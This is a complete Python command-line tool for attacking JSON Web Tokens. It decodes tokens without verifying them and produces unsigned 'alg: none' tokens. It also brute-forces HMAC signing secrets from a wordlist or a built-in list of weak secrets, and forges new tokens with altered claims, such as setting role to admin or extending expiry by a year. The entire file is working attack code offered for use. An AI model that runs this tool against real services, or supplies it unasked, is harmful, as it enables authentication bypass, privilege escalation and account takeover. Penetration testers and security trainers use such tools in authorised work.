#!/usr/bin/env python3
"""
JWT Token Cracker and Manipulator
Brute force JWT secrets and create forged tokens
"""

import jwt
import sys
import argparse
import json
import base64
from time import time
from datetime import datetime, timedelta

class JWTCracker:
    def __init__(self, token):
        self.token = token
        self.header = None
        self.payload = None
        self.signature = None
        self.algorithm = None

        self._decode_token()

    def _decode_token(self):
        """Decode JWT without verification"""
        try:
            self.header = jwt.get_unverified_header(self.token)
            self.payload = jwt.decode(self.token, options={"verify_signature": False})
            self.algorithm = self.header.get('alg', 'HS256')

            # Split token parts
            parts = self.token.split('.')
            if len(parts) == 3:
                self.signature = parts[2]

        except Exception as e:
            print(f"[!] Error decoding token: {e}")
            sys.exit(1)

    def show_info(self):
        """Display token information"""
        print("\n" + "="*60)
        print("JWT TOKEN INFORMATION")
        print("="*60)

        print("\n[*] Header:")
        print(json.dumps(self.header, indent=2))

        print("\n[*] Payload:")
        print(json.dumps(self.payload, indent=2))

        print(f"\n[*] Algorithm: {self.algorithm}")
        print(f"[*] Signature: {self.signature[:20]}...")

        # Check expiration
        if 'exp' in self.payload:
            exp_timestamp = self.payload['exp']
            exp_date = datetime.fromtimestamp(exp_timestamp)
            now = datetime.now()

            print(f"\n[*] Expiration: {exp_date}")
            if exp_date < now:
                print(f"[!] Token EXPIRED ({(now - exp_date).days} days ago)")
            else:
                print(f"[+] Token valid for {(exp_date - now).days} days")

        print("="*60 + "\n")

    def test_none_algorithm(self):
        """Test if server accepts 'none' algorithm"""
        print("\n[*] Testing 'none' algorithm attack...")

        # Create header with none
        none_header = self.header.copy()
        none_header['alg'] = 'none'

        # Encode without signature
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(none_header).encode()
        ).decode().rstrip('=')

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload).encode()
        ).decode().rstrip('=')

        none_token = f"{header_b64}.{payload_b64}."

        print(f"\n[+] None algorithm token:")
        print(none_token)
        print("\n[*] Try this token with API requests")

        return none_token

    def brute_force(self, wordlist_file, verbose=False):
        """Brute force JWT secret"""
        print(f"\n[*] Starting brute force attack...")
        print(f"[*] Wordlist: {wordlist_file}")
        print(f"[*] Algorithm: {self.algorithm}\n")

        if self.algorithm not in ['HS256', 'HS384', 'HS512']:
            print(f"[!] Cannot brute force {self.algorithm} (not HMAC)")
            return None

        start_time = time()
        attempts = 0

        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    secret = line.strip()
                    if not secret:
                        continue

                    attempts += 1

                    try:
                        # Try to verify with this secret
                        jwt.decode(
                            self.token,
                            secret,
                            algorithms=[self.algorithm]
                        )

                        # If we get here, secret is correct!
                        elapsed = time() - start_time
                        print(f"\n{'='*60}")
                        print(f"[+] SECRET FOUND: {secret}")
                        print(f"[+] Attempts: {attempts:,}")
                        print(f"[+] Time: {elapsed:.2f} seconds")
                        print(f"[+] Speed: {attempts/elapsed:.0f} attempts/sec")
                        print(f"{'='*60}\n")
                        return secret

                    except jwt.InvalidSignatureError:
                        # Wrong secret, continue
                        if verbose or attempts % 1000 == 0:
                            print(f"[*] Tried {attempts:,} secrets...", end='\r')
                        continue
                    except Exception:
                        continue

            elapsed = time() - start_time
            print(f"\n[-] Secret not found ({attempts:,} attempts in {elapsed:.2f}s)")
            return None

        except FileNotFoundError:
            print(f"[!] Wordlist file not found: {wordlist_file}")
            return None
        except Exception as e:
            print(f"[!] Error: {e}")
            return None

    def forge_token(self, secret, new_payload=None, extend_exp=False):
        """Create forged JWT with new payload"""
        print("\n[*] Forging new token...")

        payload = self.payload.copy()

        # Apply new payload values
        if new_payload:
            for key, value in new_payload.items():
                payload[key] = value
                print(f"[+] Setting {key} = {value}")

        # Extend expiration
        if extend_exp and 'exp' in payload:
            old_exp = datetime.fromtimestamp(payload['exp'])
            new_exp = datetime.now() + timedelta(days=365)
            payload['exp'] = int(new_exp.timestamp())
            print(f"[+] Extending expiration: {old_exp} -> {new_exp}")

        # Create new token
        try:
            forged = jwt.encode(
                payload,
                secret,
                algorithm=self.algorithm
            )

            print(f"\n[+] Forged token:")
            print(forged)

            return forged

        except Exception as e:
            print(f"[!] Error forging token: {e}")
            return None

    def generate_common_secrets(self):
        """Generate list of common JWT secrets"""
        common = [
            'secret', 'Secret', 'SECRET',
            'secret123', 'secret1234', 'secret12345',
            'password', 'Password', 'PASSWORD',
            'jwt', 'JWT', 'jwt_secret', 'JWT_SECRET',
            'mysecret', 'my_secret', 'mySecret',
            'admin', 'Admin', 'ADMIN',
            'root', 'Root', 'ROOT',
            'key', 'Key', 'KEY',
            '123456', '12345678', '1234567890',
            'qwerty', 'abc123', 'password123'
        ]

        return common

    def quick_test(self):
        """Quick test with common secrets"""
        print("\n[*] Quick test with common secrets...")

        common_secrets = self.generate_common_secrets()

        for i, secret in enumerate(common_secrets, 1):
            try:
                jwt.decode(
                    self.token,
                    secret,
                    algorithms=[self.algorithm]
                )

                print(f"\n[+] WEAK SECRET FOUND: {secret}")
                return secret

            except jwt.InvalidSignatureError:
                print(f"[*] Testing {i}/{len(common_secrets)}...", end='\r')
            except Exception:
                pass

        print("\n[-] No common secrets found")
        return None

def main():
    parser = argparse.ArgumentParser(
        description='JWT Token Cracker and Manipulator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Show token info
  %(prog)s -t "eyJhbG..." --info

  # Quick test with common secrets
  %(prog)s -t "eyJhbG..." --quick

  # Brute force with wordlist
  %(prog)s -t "eyJhbG..." -w wordlist.txt

  # Forge new token after finding secret
  %(prog)s -t "eyJhbG..." -s "found_secret" --forge -p '{"role":"admin"}'

  # Test none algorithm
  %(prog)s -t "eyJhbG..." --none
        '''
    )

    parser.add_argument('-t', '--token', required=True,
                        help='JWT token to crack')
    parser.add_argument('--info', action='store_true',
                        help='Show token information')
    parser.add_argument('--quick', action='store_true',
                        help='Quick test with common secrets')
    parser.add_argument('--none', action='store_true',
                        help='Test none algorithm attack')
    parser.add_argument('-w', '--wordlist',
                        help='Wordlist file for brute force')
    parser.add_argument('-s', '--secret',
                        help='Known secret for forging')
    parser.add_argument('--forge', action='store_true',
                        help='Forge new token with known secret')
    parser.add_argument('-p', '--payload',
                        help='New payload as JSON string')
    parser.add_argument('--extend-exp', action='store_true',
                        help='Extend token expiration (1 year)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    # Banner
    print("""
    ╔══════════════════════════════════════╗
    ║       JWT Token Cracker v1.0         ║
    ║    Brute Force & Token Forgery       ║
    ╚══════════════════════════════════════╝
    """)

    # Initialize cracker
    cracker = JWTCracker(args.token)

    # Show info
    if args.info or not any([args.quick, args.wordlist, args.none, args.forge]):
        cracker.show_info()

    # Quick test
    if args.quick:
        secret = cracker.quick_test()
        if secret and args.forge:
            args.secret = secret

    # Test none algorithm
    if args.none:
        cracker.test_none_algorithm()

    # Brute force
    if args.wordlist:
        secret = cracker.brute_force(args.wordlist, args.verbose)
        if secret and args.forge:
            args.secret = secret

    # Forge token
    if args.forge and args.secret:
        new_payload = {}
        if args.payload:
            try:
                new_payload = json.loads(args.payload)
            except json.JSONDecodeError:
                print(f"[!] Invalid JSON payload: {args.payload}")

        cracker.forge_token(
            args.secret,
            new_payload=new_payload,
            extend_exp=args.extend_exp
        )
    elif args.forge:
        print("[!] Please provide --secret for forging")

if __name__ == "__main__":
    main()
